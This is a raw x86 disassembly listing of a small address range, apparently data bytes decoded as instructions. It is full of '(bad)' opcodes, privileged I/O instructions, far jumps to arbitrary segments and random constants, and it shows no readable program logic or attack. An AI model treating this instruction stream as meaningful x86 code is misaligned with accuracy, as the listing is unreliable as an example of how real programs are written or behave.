  42c6ea:	mov    eax,0x8dc30a91
  42c6ef:	push   esp
  42c6f0:	pop    edi
  42c6f1:	sbb    eax,0x56ea27cd
  42c6f7:	push   esp
  42c6f8:	pushf  
  42c6f9:	(bad)  
  42c6fa:	pushf  
  42c6fb:	js     0x42c717
  42c6fd:	inc    esp
  42c6fe:	sbb    al,0xdd
  42c700:	push   ebx
  42c701:	jecxz  0x42c6fb
  42c703:	cmp    BYTE PTR [ecx-0x4c878e13],cl
  42c709:	mov    dh,0xf3
  42c70b:	outs   dx,BYTE PTR ds:[esi]
  42c70c:	dec    eax
  42c70d:	(bad)  [ecx+0x57]
  42c710:	xchg   edx,eax
  42c711:	push   es
  42c712:	daa    
  42c713:	push   esi
  42c714:	rol    BYTE PTR [eax+edx*2-0x2],cl
  42c718:	mov    ds:0x29392480,al
  42c71d:	mov    esi,0x86cdc4e7
  42c722:	mov    ah,0xd2
  42c724:	cmp    al,0x23
  42c726:	push   edx
  42c727:	ss push ebx
  42c729:	and    eax,DWORD PTR [ebx-0x3b]
  42c72c:	cmp    eax,0x20987c7a
  42c731:	test   DWORD PTR [ebx+eiz*2+0x52],esp
  42c735:	fist   WORD PTR [edx+0x48]
  42c738:	pop    esp
  42c739:	or     edi,ecx
  42c73b:	and    eax,0x4af13cf6
  42c740:	into   
  42c741:	fcomp  st(2)
  42c743:	sbb    bl,ah
  42c745:	jae    0x42c6f9
  42c747:	xchg   ecx,eax
  42c748:	ins    DWORD PTR es:[edi],dx
  42c749:	adc    DWORD PTR [esi],esp
  42c74b:	sub    DWORD PTR [edi-0x7da68463],0xd966e0bf
  42c755:	adc    eax,0x9b7ec9c8
  42c75a:	xor    BYTE PTR [edx-0x28],0x64
  42c75e:	push   esp
  42c75f:	xor    BYTE PTR [ecx-0x48],ch
  42c762:	sbb    ah,al
  42c764:	dec    ecx
  42c765:	and    al,dh
  42c767:	mov    bl,ch
  42c769:	out    0xda,al
  42c76b:	xor    DWORD PTR [eax],0xffffffda
  42c76e:	cmp    cl,BYTE PTR [ebp-0x3f1700c7]
  42c774:	(bad)  
  42c775:	test   BYTE PTR [ecx],0xe6
  42c778:	cmp    al,0x5e
  42c77a:	sub    eax,DWORD PTR [ebx-0x5d]
  42c77d:	ja     0x42c71a
  42c77f:	sub    esp,DWORD PTR [eax-0x23389448]
  42c785:	das    
  42c786:	mov    dl,0x29
  42c788:	push   es
  42c789:	(bad)  
  42c78b:	push   eax
  42c78c:	aam    0xe1
  42c78e:	ins    DWORD PTR es:[edi],dx
  42c78f:	sub    DWORD PTR [eax],eax
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0xad1da40e
  42c802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c803:	pop    edx
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	cmp    DWORD PTR [edx+0x4a0685f6],0x3e
  42c813:	imul   esi,DWORD PTR [edi+ebx*1-0x80],0xc
  42c818:	push   eax
  42c819:	adc    bl,BYTE PTR [ebp+0x3eeffc17]
  42c81f:	mov    bl,0xc7
  42c821:	cmp    ebp,DWORD PTR [esi-0x69]
  42c824:	sub    dh,BYTE PTR [esp+ebx*8]
  42c827:	popa   
  42c828:	inc    ebx
  42c829:	jns    0x42c7c0
  42c82b:	mov    esp,0x7616ae06
  42c831:	mov    es,WORD PTR [ecx+0x78805e42]
  42c837:	outs   dx,BYTE PTR ds:[esi]
  42c838:	inc    edx
  42c839:	add    ch,bl
  42c83b:	fs loopne 0x42c897
  42c83e:	fs push esi
  42c840:	and    BYTE PTR [ebx],bl
  42c842:	stos   BYTE PTR es:[edi],al
  42c843:	ins    DWORD PTR es:[edi],dx
  42c844:	sub    ch,0x53
  42c847:	jno    0x42c88e
  42c849:	adc    BYTE PTR [ebx],bh
  42c84b:	push   ss
  42c84c:	pop    ebp
  42c84d:	cli    
  42c84e:	push   edi
  42c84f:	iret   
  42c850:	push   edx
  42c851:	imul   ebp,esi,0xffffffea
  42c854:	pop    ss
  42c855:	or     bl,bl
  42c857:	lahf   
  42c858:	arpl   WORD PTR [ebx+0x6630cc5a],di
  42c85e:	xor    BYTE PTR [edi+ecx*8-0x2f],bl
  42c862:	mov    bh,0x54
  42c864:	loopne 0x42c868
  42c866:	sti    
  42c867:	dec    edi
  42c868:	xor    eax,0xcecd5ca3
  42c86d:	push   ecx
  42c86e:	adc    dl,bl
  42c870:	cli    
  42c871:	cwde   
  42c872:	xor    BYTE PTR [edx+ebp*1-0x4994309],bl
  42c879:	cld    
  42c87a:	inc    esp
  42c87b:	sub    eax,esi
  42c87d:	and    al,0xce
  42c87f:	mov    dl,BYTE PTR [ebx]
  42c881:	and    eax,0xf6449519
  42c886:	xchg   BYTE PTR [edx-0x79],bh
  42c889:	sbb    BYTE PTR [eax],0x47
  42c88c:	xchg   esp,eax
  42c88d:	cmp    ebp,DWORD PTR [esi+0x6e1db5df]
  42c893:	test   al,0x2f
  42c895:	inc    esi
  42c896:	xchg   edx,eax
  42c897:	pop    ss
  42c898:	and    al,0x3a
  42c89a:	pop    ecx
  42c89b:	and    bh,BYTE PTR [eax+0x326f42aa]
  42c8a1:	lock add bl,BYTE PTR [ebp-0x2d]
  42c8a5:	cs push ds
  42c8a7:	stos   DWORD PTR es:[edi],eax
  42c8a8:	jnp    0x42c899
  42c8aa:	sbb    BYTE PTR [edx+0x44ff1f29],0x1
  42c8b1:	ins    DWORD PTR es:[edi],dx
  42c8b2:	jbe    0x42c870
  42c8b4:	pop    ebx
  42c8b5:	imul   ecx,esp,0x4fec4b6d
  42c8bb:	dec    esp
  42c8bc:	test   eax,0x2bb83574
  42c8c1:	xchg   ebp,eax
  42c8c2:	outs   dx,BYTE PTR es:[esi]
  42c8c4:	mov    ds:0x228e2772,al
  42c8ca:	push   ebp
  42c8cb:	xchg   esp,eax
  42c8cc:	push   ebp
  42c8cd:	inc    ebp
  42c8ce:	scas   eax,DWORD PTR es:[edi]
  42c8cf:	fnstsw WORD PTR [edx]
  42c8d1:	mov    dl,0x91
  42c8d3:	rcr    DWORD PTR [eax+ebp*4],1
  42c8d6:	jae    0x42c914
  42c8d8:	out    dx,eax
  42c8d9:	push   cs
  42c8da:	pop    esp
  42c8db:	ret    0x696a
  42c8de:	mov    DWORD PTR [esi+0x739201e8],0x9aa568a8
  42c8e8:	push   eax
  42c8e9:	dec    ecx
  42c8ea:	test   DWORD PTR [ecx],edi
  42c8ec:	cmp    BYTE PTR [esi-0x51b34ac7],cl
  42c8f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c8f3:	lods   eax,DWORD PTR ds:[esi]
  42c8f4:	test   DWORD PTR [edi+0x10],esi
  42c8f7:	or     eax,0x8430342c
  42c8fc:	hlt    
  42c8fd:	imul   edi,DWORD PTR [eax+0x4114932c],0x54
  42c904:	mov    esi,0xa7f53fd5
  42c909:	loop   0x42c965
  42c90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c90c:	mov    bh,0x4
  42c90e:	lds    ebx,FWORD PTR [eax+eax*1+0x0]
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x3d83680d
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	test   BYTE PTR [ebp-0x6d859f88],cl
  42c992:	xor    al,0x76
  42c994:	xchg   esi,eax
  42c995:	cmp    ebp,DWORD PTR [eax-0x4c127717]
  42c99b:	cmp    esp,DWORD PTR [ecx+0x7e180a07]
  42c9a1:	or     DWORD PTR [edi-0x3e],0xffffff89
  42c9a5:	cmp    esi,DWORD PTR [ecx+eax*8+0x1a21856c]
  42c9ac:	adc    al,0x69
  42c9ae:	cs scas al,BYTE PTR es:[edi]
  42c9b0:	add    al,0xeb
  42c9b2:	push   es
  42c9b3:	int3   
  42c9b4:	jne    0x42c95b
  42c9b6:	and    DWORD PTR [ecx],ecx
  42c9b8:	sub    al,0x82
  42c9ba:	rol    edx,1
  42c9bc:	ja     0x42c9e8
  42c9be:	jo     0x42c97c
  42c9c0:	pop    ecx
  42c9c1:	scas   eax,DWORD PTR es:[edi]
  42c9c2:	push   0xa97782b9
  42c9c7:	js     0x42c9cd
  42c9c9:	hlt    
  42c9ca:	repz jmp 0xbc76:0xfc32f1d3
  42c9d2:	imul   edx,DWORD PTR ds:0x5d1ee207,0x3e8ec22a
  42c9dc:	inc    edx
  42c9dd:	shl    DWORD PTR [edi],1
  42c9df:	dec    edx
  42c9e0:	jno    0x42c9fd
  42c9e2:	loope  0x42ca60
  42c9e4:	aad    0xfe
  42c9e6:	mov    ebx,0xcfe56231
  42c9eb:	js     0x42c9e3
  42c9ed:	icebp  
  42c9ee:	leave  
  42c9ef:	pop    esp
  42c9f0:	nop
  42c9f1:	cmc    
  42c9f2:	into   
  42c9f3:	mov    ch,0x1b
  42c9f5:	rol    BYTE PTR [esi+eiz*2+0x5c],0x37
  42c9fa:	cmc    
  42c9fb:	xchg   DWORD PTR [eax-0x19],eax
  42c9fe:	pusha  
  42c9ff:	adc    dh,BYTE PTR [edx+esi*1]
  42ca02:	pop    esp
  42ca03:	out    dx,eax
  42ca04:	sub    al,0xb6
  42ca06:	fwait
  42ca07:	inc    edx
  42ca08:	ret    0x32da
  42ca0b:	out    dx,al
  42ca0c:	fld    TBYTE PTR ds:0x27ca0d5d
  42ca12:	fmul   DWORD PTR [ecx+0x9c4c694]
  42ca18:	sti    
  42ca19:	popa   
  42ca1a:	test   DWORD PTR [ebx-0x47],0xb91a67f8
  42ca21:	data16 mov dl,0x2b
  42ca24:	xchg   esp,eax
  42ca25:	clc    
  42ca26:	cli    
  42ca27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca28:	mov    al,ds:0x7ef37579
  42ca2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca2e:	mov    edx,cs
  42ca30:	jecxz  0x42c9ed
  42ca32:	or     al,0x3c
  42ca34:	aam    0x69
  42ca36:	bound  ebp,QWORD PTR [eax]
  42ca38:	lahf   
  42ca39:	add    ch,BYTE PTR [esi]
  42ca3b:	sbb    esi,DWORD PTR [edx+0x57]
  42ca3e:	add    al,0x85
  42ca40:	jnp    0x42ca36
  42ca42:	lods   eax,DWORD PTR ds:[esi]
  42ca43:	imul   edx,DWORD PTR [ebp+0x68913f04],0x6363e96f
  42ca4d:	add    ah,dh
  42ca4f:	sbb    DWORD PTR [ecx+ebx*2+0x79aa9071],ebx
  42ca56:	sub    edx,DWORD PTR [ebx-0x3e]
  42ca59:	mov    dl,0xd1
  42ca5b:	arpl   bx,bx
  42ca5d:	dec    ebp
  42ca5e:	rcr    DWORD PTR [edi+0x7630c067],1
  42ca64:	push   cs
  42ca65:	sbb    eax,0x793cf48f
  42ca6a:	in     al,dx
  42ca6b:	pop    eax
  42ca6c:	sub    DWORD PTR [eax+esi*4+0x3a],esi
  42ca70:	xchg   ecx,eax
  42ca71:	gs jne 0x42ca0c
  42ca74:	imul   edx,DWORD PTR [edi],0x93181bbf
  42ca7a:	mov    ecx,0x1eb23f06
  42ca7f:	or     ebp,0x7821778d
  42ca85:	adc    edx,DWORD PTR [edx+edx*2-0x4f8ab73a]
  42ca8c:	mov    al,0x22
  42ca8e:	mov    WORD PTR [edi+0x0],es
	...
  42caf1:	add    BYTE PTR [eax],al
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x7c239140]
  42cb02:	sub    BYTE PTR [edi-0x4],dh
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	pusha  
  42cb0d:	and    BYTE PTR [esi+0x7a],ah
  42cb10:	adc    cl,ch
  42cb12:	adc    edx,eax
  42cb14:	in     al,0x9c
  42cb16:	xor    DWORD PTR [eax],edi
  42cb18:	xchg   BYTE PTR ds:0xa0a4fd20,dh
  42cb1e:	lea    esi,[ecx]
  42cb20:	mov    cl,BYTE PTR [edx-0x20f48ee6]
  42cb26:	add    ebp,DWORD PTR [ecx]
  42cb28:	ror    BYTE PTR [edx+ebx*4+0x2591e3dd],0x58
  42cb30:	jl     0x42cb9b
  42cb32:	shl    BYTE PTR [esi-0x62],0xec
  42cb36:	(bad)  
  42cb37:	std    
  42cb38:	out    dx,eax
  42cb39:	mov    ebp,0xa784cf69
  42cb3e:	add    cl,BYTE PTR [ebp+0x4ca6721e]
  42cb44:	push   esp
  42cb45:	je     0x42cb91
  42cb47:	jle    0x42cb49
  42cb49:	in     al,dx
  42cb4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb4b:	and    dl,BYTE PTR [edi-0x119e62b6]
  42cb51:	cmc    
  42cb52:	push   ss
  42cb53:	sub    ecx,DWORD PTR [edi-0x34]
  42cb56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb57:	jb     0x42cb9a
  42cb59:	fwait
  42cb5a:	ja     0x42cb8a
  42cb5c:	mov    bh,0x21
  42cb5e:	or     eax,0x3da7f204
  42cb63:	retf   
  42cb64:	xchg   ecx,eax
  42cb65:	xchg   edi,eax
  42cb66:	ss dec ebx
  42cb68:	push   esp
  42cb69:	dec    edx
  42cb6a:	inc    eax
  42cb6b:	fucom  st(4)
  42cb6d:	shl    DWORD PTR [edx-0x4c7b5ca1],0x50
  42cb74:	add    BYTE PTR ds:0x16a92e8b,bl
  42cb7a:	lea    esi,[esi+0x36]
  42cb7d:	lods   eax,DWORD PTR ds:[esi]
  42cb7e:	jne    0x42cb21
  42cb80:	push   cs
  42cb81:	jae    0x42cbb0
  42cb83:	sbb    bh,ch
  42cb85:	sub    DWORD PTR [ebp-0x7ae7b0bf],ebx
  42cb8b:	mov    ebp,0xa4e013a2
  42cb90:	sbb    ecx,DWORD PTR [edx]
  42cb92:	adc    ecx,edi
  42cb94:	adc    eax,0xdc533f5c
  42cb99:	inc    eax
  42cb9a:	out    dx,eax
  42cb9b:	sub    al,BYTE PTR [ecx]
  42cb9d:	stc    
  42cb9e:	loopne 0x42cb8e
  42cba0:	enter  0xd66,0x0
  42cba4:	adc    esi,ebx
  42cba6:	out    dx,al
  42cba7:	mov    edx,0x5c6c20f
  42cbac:	and    eax,0x56e5f9fd
  42cbb1:	add    eax,0xe03b9069
  42cbb6:	add    BYTE PTR [ebp-0xc],bl
  42cbb9:	mov    edi,0xe56e5bdb
  42cbbe:	xchg   esi,eax
  42cbbf:	sub    eax,0xd85eeff7
  42cbc4:	cmp    eax,0xb7db9ea3
  42cbc9:	test   eax,0x5a3888bb
  42cbce:	or     bh,ch
  42cbd0:	adc    al,0xf2
  42cbd2:	sti    
  42cbd3:	pop    ebx
  42cbd4:	mov    esi,0xab5bbc94
  42cbd9:	dec    esp
  42cbda:	jmp    0x6e82:0x817f8dda
  42cbe1:	add    al,ah
  42cbe3:	aas    
  42cbe4:	aas    
  42cbe5:	mov    dh,BYTE PTR [esi+0x9]
  42cbe8:	test   BYTE PTR [edx],bl
  42cbea:	sub    ah,dl
  42cbec:	jmp    0x6451:0x873af455
  42cbf3:	mov    DWORD PTR [esi],0x6d4e56e6
  42cbf9:	xchg   edx,eax
  42cbfa:	pushf  
  42cbfb:	imul   ebx,DWORD PTR [esi+0x23d54696],0x8961f32d
  42cc05:	pop    es
  42cc06:	jmp    0x2c2eaef2
  42cc0b:	lea    esi,[ecx-0x52]
  42cc0e:	jge    0x42cc04
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xf15df786
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	mov    ch,0xae
  42cc8e:	lods   al,BYTE PTR ds:[esi]
  42cc8f:	mov    eax,0x96ba8cf3
  42cc94:	pop    eax
  42cc95:	test   eax,esp
  42cc97:	ins    DWORD PTR es:[edi],dx
  42cc98:	(bad)  
  42cc99:	sbb    eax,0xbacc1b0a
  42cc9e:	rcl    DWORD PTR [edx],0xbf
  42cca1:	mov    ah,0xab
  42cca3:	aam    0x62
  42cca5:	cmc    
  42cca6:	aad    0xcf
  42cca8:	mov    cl,0x3f
  42ccaa:	or     eax,0x401ec277
  42ccaf:	pop    eax
  42ccb0:	out    0xd1,al
  42ccb2:	push   esp
  42ccb3:	pop    esp
  42ccb4:	test   edx,esp
  42ccb6:	stos   DWORD PTR es:[edi],eax
  42ccb7:	sbb    ebp,DWORD PTR [edx+0x2b]
  42ccba:	(bad)  
  42ccbb:	fstp   TBYTE PTR [edi]
  42ccbd:	jge    0x42cc5e
  42ccbf:	and    eax,0x15f35eac
  42ccc4:	xlat   BYTE PTR ds:[ebx]
  42ccc5:	mov    ds:0x3403fa14,eax
  42ccca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cccb:	jecxz  0x42ccf2
  42cccd:	jnp    0x42cce2
  42cccf:	sbb    al,cl
  42ccd1:	in     eax,0xcc
  42ccd3:	jnp    0x42cd40
  42ccd5:	xchg   ecx,eax
  42ccd6:	aad    0x4a
  42ccd8:	out    dx,al
  42ccd9:	inc    ecx
  42ccda:	or     BYTE PTR [ecx],al
  42ccdc:	(bad)  
  42ccdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ccde:	cwde   
  42ccdf:	js     0x42cd0c
  42cce1:	test   al,0x86
  42cce3:	mov    eax,ds:0xc02a5897
  42cce8:	xor    DWORD PTR [esi*2-0x67d976e7],0x9d2a491
  42ccf3:	mov    esp,0x5a47c4a9
  42ccf8:	add    DWORD PTR cs:[edx-0x24],esp
  42ccfc:	adc    al,0xb7
  42ccfe:	hlt    
  42ccff:	stos   DWORD PTR es:[edi],eax
  42cd00:	test   al,0xfe
  42cd02:	mov    al,ds:0xca70c406
  42cd07:	js     0x42cd61
  42cd09:	(bad)
  42cd0c:	inc    esi
  42cd0d:	sub    al,0xed
  42cd0f:	mov    eax,0x789aa6f3
  42cd14:	xchg   edi,eax
  42cd15:	repz add BYTE PTR [ebx-0x49f782de],0x9a
  42cd1d:	push   esp
  42cd1e:	stos   BYTE PTR es:[edi],al
  42cd1f:	js     0x42cd5e
  42cd21:	loop   0x42cd23
  42cd23:	int3   
  42cd24:	jmp    0x42cd96
  42cd26:	adc    esp,edx
  42cd28:	sub    ch,BYTE PTR [edx]
  42cd2a:	addr16 pop edx
  42cd2c:	out    dx,al
  42cd2d:	(bad)
  42cd30:	cmc    
  42cd31:	and    ah,BYTE PTR [edi-0x44]
  42cd34:	repnz adc ebp,DWORD PTR [ecx+0x55d7b8dd]
  42cd3b:	pop    DWORD PTR [ebx+0x3683ea90]
  42cd41:	or     eax,0x8b4ba30b
  42cd46:	mov    ah,BYTE PTR [ebp-0x63]
  42cd49:	ret    0xe6f6
  42cd4c:	mov    eax,ds:0xd267329
  42cd51:	jne    0x42ccdf
  42cd53:	imul   esi,DWORD PTR [edx-0x41],0x478302a8
  42cd5a:	rcl    cl,1
  42cd5c:	nop
  42cd5d:	push   esi
  42cd5e:	mov    ds:0x77df327,eax
  42cd63:	xor    al,al
  42cd65:	cs push ecx
  42cd67:	mov    cl,0x79
  42cd69:	and    ebx,DWORD PTR [edx+0x5b]
  42cd6c:	sbb    esp,DWORD PTR [eax-0x6e]
  42cd6f:	add    dl,dh
  42cd71:	aam    0xe6
  42cd73:	xor    eax,0x4179b98b
  42cd78:	adc    cx,WORD PTR gs:[esi-0x75]
  42cd7d:	out    0xb4,al
  42cd7f:	js     0x42cdf5
  42cd81:	and    DWORD PTR [eax+ebx*2],0xffffff80
  42cd85:	jg     0x42cd2a
  42cd87:	adc    esi,DWORD PTR ds:0x22f964fc
  42cd8d:	retf   
  42cd8e:	loop   0x42cdf6
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x5
  42ce01:	add    DWORD PTR [edi-0x48],esp
  42ce04:	add    al,0xe0
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	mov    ds:0x937172e1,al
  42ce11:	ss sbb ebx,edx
  42ce14:	nop
  42ce15:	adc    eax,0x974740b7
  42ce1a:	mov    ch,0xc3
  42ce1c:	test   BYTE PTR [ebx+eiz*4-0xc4edb1],0x70
  42ce24:	sub    dl,dh
  42ce26:	outs   dx,DWORD PTR ds:[esi]
  42ce27:	sbb    DWORD PTR [esp+ecx*4],0x922d9875
  42ce2e:	adc    al,0xce
  42ce30:	aad    0x7d
  42ce32:	push   ds
  42ce33:	loope  0x42ce27
  42ce35:	push   esi
  42ce36:	ds clc 
  42ce38:	mov    esi,0x733c3cb6
  42ce3d:	xchg   esp,eax
  42ce3e:	sti    
  42ce3f:	inc    ecx
  42ce40:	fst    DWORD PTR [eax-0x6a1f1fce]
  42ce46:	sbb    DWORD PTR [ebp+0x312fa73f],0x59
  42ce4d:	(bad)  [ecx]
  42ce4f:	ds jl  0x42cdf1
  42ce52:	xchg   edi,eax
  42ce53:	sbb    DWORD PTR [ebx],esp
  42ce55:	fnstsw WORD PTR [eax+0x56]
  42ce58:	xor    dl,bh
  42ce5a:	(bad)  
  42ce5c:	cmp    ebx,edx
  42ce5e:	adc    al,0xa4
  42ce60:	pop    ds
  42ce61:	jle    0x42ce9a
  42ce63:	cs or  al,0x6f
  42ce66:	xchg   ecx,eax
  42ce67:	outs   dx,DWORD PTR ds:[esi]
  42ce68:	or     ecx,DWORD PTR [esi-0x5c]
  42ce6b:	or     eax,0x75025f53
  42ce70:	push   ebp
  42ce71:	(bad)  
  42ce73:	imul   esi,DWORD PTR [edi-0x8],0x4b
  42ce77:	dec    edi
  42ce78:	cwde   
  42ce79:	jp     0x42cee9
  42ce7b:	xchg   edx,eax
  42ce7c:	push   edi
  42ce7d:	sbb    DWORD PTR [ecx-0x3ae2c995],ebx
  42ce83:	stc    
  42ce84:	in     al,dx
  42ce85:	call   0xe787:0xce5096f5
  42ce8c:	ja     0x42ce57
  42ce8e:	daa    
  42ce8f:	shr    DWORD PTR [edi-0x2771f5ab],0xd5
  42ce96:	es pop ds
  42ce98:	jmp    0x42ced8
  42ce9a:	dec    ecx
  42ce9b:	std    
  42ce9c:	pop    ecx
  42ce9d:	aas    
  42ce9e:	in     eax,dx
  42ce9f:	or     DWORD PTR [edx],ecx
  42cea1:	add    DWORD PTR [eax],edx
  42cea3:	sub    eax,0xb2a3dc9a
  42cea8:	push   edi
  42cea9:	jp     0x42cf06
  42ceab:	mov    bl,0xe2
  42cead:	imul   eax,DWORD PTR [ebx+0x7a],0x56eba0ac
  42ceb4:	inc    eax
  42ceb5:	or     DWORD PTR [esi],ebp
  42ceb7:	out    0x17,al
  42ceb9:	push   ds
  42ceba:	ins    BYTE PTR es:[edi],dx
  42cebb:	ret    0xae6d
  42cebe:	and    eax,0xa0688c92
  42cec3:	sahf   
  42cec4:	and    bl,cl
  42cec6:	mov    esp,0xd621ef43
  42cecb:	pop    ecx
  42cecc:	enter  0x739,0x33
  42ced0:	loope  0x42cedf
  42ced2:	xor    ah,BYTE PTR [esp+edi*4-0x1f]
  42ced6:	xor    bh,BYTE PTR [esi-0x19a5e6fc]
  42cedc:	daa    
  42cedd:	xchg   ecx,eax
  42cede:	pop    ss
  42cedf:	dec    ebp
  42cee0:	mov    dl,0x40
  42cee2:	adc    BYTE PTR [ebx-0x32fc65d8],bh
  42cee8:	sbb    eax,0xd784676
  42ceed:	xor    al,0x38
  42ceef:	push   ds
  42cef0:	fnop   
  42cef2:	sbb    DWORD PTR [ebx],0x6aba669a
  42cef8:	nop
  42cef9:	(bad)  
  42cefa:	sbb    al,0xf8
  42cefc:	jp     0x42cea4
  42cefe:	mov    es,WORD PTR [eax+0x35d65b9c]
  42cf04:	mov    ?,esp
  42cf06:	pop    edx
  42cf07:	cld    
  42cf08:	imul   eax,ebp,0xfec2e4eb
  42cf0e:	add    BYTE PTR [eax+0x0],al
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    eax,FWORD PTR [esi]
  42cf81:	adc    bh,BYTE PTR [eax]
  42cf83:	das    
  42cf84:	or     cl,ah
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	xchg   ebp,eax
  42cf8d:	pop    ebx
  42cf8e:	pop    edx
  42cf8f:	inc    eax
  42cf90:	in     al,dx
  42cf91:	mov    ah,BYTE PTR [edi-0x26]
  42cf94:	mov    edx,0xff34d9a6
  42cf99:	fnstsw WORD PTR [eax+0x452e1753]
  42cf9f:	jno    0x42cffe
  42cfa1:	xchg   DWORD PTR [ecx+0x64],esp
  42cfa4:	out    dx,al
  42cfa5:	push   ds
  42cfa6:	ret    
  42cfa7:	jge    0x42d007
  42cfa9:	cmp    BYTE PTR [edx+0x1d],0x32
  42cfad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfae:	and    DWORD PTR [esi-0x4],0x96ffd6fe
  42cfb5:	(bad)  
  42cfb6:	sub    al,0x8e
  42cfb8:	ins    BYTE PTR es:[edi],dx
  42cfb9:	pop    esi
  42cfba:	dec    edx
  42cfbb:	mov    ds,WORD PTR [eax-0xf]
  42cfbe:	ja     0x42cf8a
  42cfc0:	js     0x42cf47
  42cfc2:	jmp    0x37205079
  42cfc7:	pop    edi
  42cfc8:	adc    eax,edi
  42cfca:	mov    BYTE PTR [edi],cl
  42cfcc:	push   eax
  42cfcd:	add    eax,0xa3e5dfd4
  42cfd2:	mov    eax,0x2482dd02
  42cfd7:	sbb    eax,DWORD PTR [edi]
  42cfd9:	push   ss
  42cfda:	in     al,0xc2
  42cfdc:	xchg   ebx,esi
  42cfde:	gs adc eax,0x5f2e59ef
  42cfe4:	push   ss
  42cfe5:	jecxz  0x42d052
  42cfe7:	out    0x89,al
  42cfe9:	xchg   esi,eax
  42cfea:	sbb    BYTE PTR [eax],cl
  42cfec:	mov    ebp,0xad69a7c5
  42cff1:	adc    al,0xbd
  42cff3:	cld    
  42cff4:	jne    0x42cfdb
  42cff6:	es sahf 
  42cff8:	adc    al,0x2a
  42cffa:	test   DWORD PTR [eax+0x66d7f1a0],ebx
  42d000:	bound  eax,QWORD PTR [ebx+0x59]
  42d003:	fild   QWORD PTR [edi-0x6c]
  42d006:	push   ecx
  42d007:	sbb    BYTE PTR [esi-0x373f364a],ch
  42d00d:	rol    edi,0xd6
  42d010:	jge    0x42d011
  42d012:	daa    
  42d013:	bound  ecx,QWORD PTR [ebx-0x7999d54d]
  42d019:	repnz pop ecx
  42d01b:	mov    cl,0x35
  42d01d:	sbb    al,0xb9
  42d01f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d020:	push   es
  42d021:	lock les ebp,FWORD PTR [eax]
  42d024:	mov    al,ds:0xe0f88362
  42d029:	lds    esi,FWORD PTR [edx-0x27]
  42d02c:	imul   DWORD PTR [ecx+eiz*4]
  42d02f:	push   ecx
  42d030:	je     0x42cfdf
  42d032:	ins    BYTE PTR es:[edi],dx
  42d033:	out    dx,al
  42d034:	outs   dx,DWORD PTR ds:[esi]
  42d035:	out    0x1d,al
  42d037:	fisttp WORD PTR [ebp-0x5c]
  42d03a:	dec    ebp
  42d03b:	ins    BYTE PTR es:[edi],dx
  42d03c:	pop    esi
  42d03d:	jmp    0x42d043
  42d03f:	test   DWORD PTR [ebp+0x1f],edi
  42d042:	jnp    0x42d0b7
  42d044:	std    
  42d045:	test   al,0xc4
  42d047:	ror    BYTE PTR [edi],1
  42d049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d04a:	inc    edx
  42d04b:	mov    al,ds:0x845014a0
  42d050:	mov    eax,ds:0x6933911d
  42d055:	inc    ebp
  42d056:	pop    edi
  42d057:	stos   DWORD PTR es:[edi],eax
  42d058:	ret    
  42d059:	mov    esp,0x1f7ab0b4
  42d05e:	xchg   edx,eax
  42d05f:	test   al,0xc9
  42d061:	test   eax,0xabd0a5d7
  42d066:	jecxz  0x42d037
  42d068:	inc    eax
  42d069:	cmp    bh,dl
  42d06b:	retf   
  42d06c:	mov    ebx,0xa289eec4
  42d071:	lods   al,BYTE PTR ds:[esi]
  42d072:	mov    eax,0xefc4f000
  42d077:	pand   mm3,mm4
  42d07a:	lods   eax,DWORD PTR ds:[esi]
  42d07b:	sbb    DWORD PTR [edx+0x54],0x40c01f24
  42d082:	jb     0x42d0f9
  42d084:	dec    ecx
